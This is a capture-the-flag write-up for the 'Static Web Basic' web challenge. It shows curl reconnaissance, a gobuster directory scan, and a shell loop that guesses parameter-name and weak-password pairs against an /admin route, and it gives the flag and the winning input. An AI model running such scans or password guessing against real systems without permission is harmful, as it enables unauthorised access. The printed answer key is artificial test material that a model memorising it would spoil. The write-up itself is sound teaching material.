# Static Web Basic

> **Category**: Web · **Flag**: `auppCTF{static_web_instance}`

***

### Part 1 — What Actually Worked (Clean Solve Path)

#### Step 1: Baseline recon

```bash
curl -v http://<host>:<port>/
```

Response:

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.13
Content-Type: text/html; charset=utf-8
Content-Length: 15

Try harder 😉
```

Confirmed via hex dump that this is _exactly_ 15 bytes — `"Try harder "` + the raw 4-byte UTF-8 encoding of U+1F609 (😉), nothing appended, no hidden bytes, no HTML at all. This isn't a page to "view-source" — it's a flavor-text string literal in the Flask route. Don't linger here; move to enumeration immediately.

#### Step 2: Directory brute force

```bash
gobuster dir -u http://<host>:<port>/ -w common.txt
# (we used a hand-rolled Python threaded scanner with the same wordlist)
```

Every path 404s **except**:

```
GET /admin → 200 "Access denied"
```

That a plain word returns `200` instead of `404` is the signal to stop and think, not to keep scanning.

#### Step 3: Read the `/admin` response like a detective, not a scanner

```bash
curl -i http://<host>:<port>/admin
```

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.13
Content-Type: text/html; charset=utf-8
Content-Length: 13

Access denied
```

The critical detail: **no `WWW-Authenticate` header**. If this were real HTTP Basic Auth, the server would reply `401` with a challenge header. Getting a friendly `200 Access denied` instead means this is hand-rolled application logic — literally an `if` statement inside the Flask view function. For a challenge explicitly labeled "basic," the simplest thing a beginner-level author would reach for is `request.args.get(...)`, not session/cookie logic, not IP-address logic, not cryptographic signing.

#### Step 4: Guess parameter name and value _together_

The mistake to avoid: don't test "50 parameter names" and "50 passwords" as two separate sweeps. Test them as **pairs**.

```bash
for param in key password pass pwd secret token code pin auth access; do
  for val in admin password letmein 123456 secret changeme; do
    curl -s -G --data-urlencode "$param=$val" http://<host>:<port>/admin
  done
done
```

Hit:

```
?key=letmein → auppCTF{static_web_instance}
```

`letmein` is a classic "textbook example" weak password — exactly the kind of value a challenge author would pick for a "really basic" gate.

**Total request count for the clean path: well under 100.**
